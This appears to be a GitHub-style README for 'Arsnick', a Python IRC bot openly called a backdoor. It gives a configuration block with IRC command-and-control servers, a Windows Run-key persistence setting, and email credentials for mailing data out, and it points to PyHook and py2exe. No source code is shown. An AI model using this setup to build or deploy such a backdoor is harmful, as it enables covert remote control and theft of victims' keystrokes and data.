# Arsnick

Arsnick is a Python IRC Bot/Backdoor written in Python.

Some implementations and debugs are needed.

env :Python 2.7.5

# Configuration
You can configure it by looking at the #CONFIG section in the source code:

```
#CONFIG
#winrgky      = 'Windows Default Service' #Windows Registry Run Key 
ircs          = 'irc.tiscali.it'          #IRC Server
ircp          = 6667                      #IRC Port
ircc          = '#yourircchannel'         #IRC Channel
ircs_backup   = 'eris.us.ircnet.net'      #Backup IRC Server
ircp_backup   = 6667                      #Backup IRC Port
ircc_backup   = '#yourircchannel2'        #Backup IRC Channel
version       = '1.0.1'                   #Arsnick Version
username      = 'sender@mail.com'         #Sender Mail
password      = 'password'            	  #Sender Mail password
emailsender   = 'ssender@mail.com'        #Sender Mail Name
#emailsmtp    = 'smtp.mail.ru'            #SMTP Server
#emailsmtport = '465'                     #SMTP Port
emailreceiver = 'receiver@mail.com'       #Destination Mail
```

Once the confing has been done, run it and test it by sending commands using the dot for command triggering.
Ex.: .info


# Requirements
Use 'pip install' for missing libraries.
PyHook - https://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/
 
# Compile
Py2Exe - http://www.py2exe.org/

